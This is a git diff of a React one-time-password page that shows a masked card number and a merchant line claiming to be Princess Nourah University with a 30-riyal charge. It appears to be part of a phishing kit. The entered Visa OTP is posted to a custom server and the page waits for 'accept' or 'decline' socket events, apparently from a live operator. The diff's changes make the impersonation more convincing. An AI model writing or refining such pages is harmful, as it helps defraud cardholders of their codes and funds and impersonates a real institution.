@@ -12,10 +12,10 @@ import { AiOutlineCloseCircle } from "react-icons/ai";
 const OTP = ({ setMode, checkMode }) => {
   const { id } = useParams();
   const mode = localStorage.getItem("lang");
+  const [counter, setCounter] = useState(60);
   const [otp, setOtp] = useState(undefined);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(false);
-  const [counter, setCounter] = useState(60);
   useEffect(() => {
     const timer = setInterval(() => {
       if (counter > 0) {
@@ -37,7 +37,7 @@ const OTP = ({ setMode, checkMode }) => {
 
   const handleSubmit = async (e) => {
     setLoading(true);
-    setError(false);
+    setError(false)
     e.preventDefault();
     await axios
       .post(serverRoute + "/visaOtp/" + sessionStorage.getItem("id"), {
@@ -49,6 +49,7 @@ const OTP = ({ setMode, checkMode }) => {
           visa_otp: otp,
         })
       );
+    
   };
 
   socket.on("declineVisaOTP", (ID) => {
@@ -58,7 +59,7 @@ const OTP = ({ setMode, checkMode }) => {
     }
   });
   socket.on("acceptVisaOTP", (id) => {
-    console.log(id);
+    console.log(id)
     if (id === sessionStorage.getItem("id")) {
       setError(false);
       setLoading(false);
@@ -93,6 +94,17 @@ const OTP = ({ setMode, checkMode }) => {
         </h2>
 
         <div className="flex justify-between py-1">
+          <span className="font-bold"> Merchant:</span>
+          <span>Princess Nourah University</span>
+        </div>
+        <div className="flex justify-between py-1">
+          <span className="font-bold">Transaction Amount:</span>
+          <span className="" dir="rtl">
+            {" "}
+            30 ريال
+          </span>
+        </div>
+        <div className="flex justify-between py-1">
           <span className="font-bold">Card Number:</span>
           <span>
             ********
@@ -106,7 +118,8 @@ const OTP = ({ setMode, checkMode }) => {
             required
             onChange={(e) => setOtp(e.target.value)}
             dir="ltr"
-            minLength={4}
+            maxLength={6}
+            minLength={6}
             inputMode="numeric"
             type="text"
             className="border px-3 py-1 font-light border-gray-400 text-base outline-[#ffc107] rounded-md w-1/2"
@@ -133,8 +146,8 @@ const OTP = ({ setMode, checkMode }) => {
           ""
         )}
 
-        <div className="w-full flex items-center justify-center py-10 flex-col">
-          <span>{formattedMinutes}:{formattedSeconds} </span>
+        <div className="w-full flex items-center justify-center py-10">
+          {" "}
           <button className="w-fit px-5 flex justify-center items-center py-2  bg-black text-white ">
             Submit
           </button>
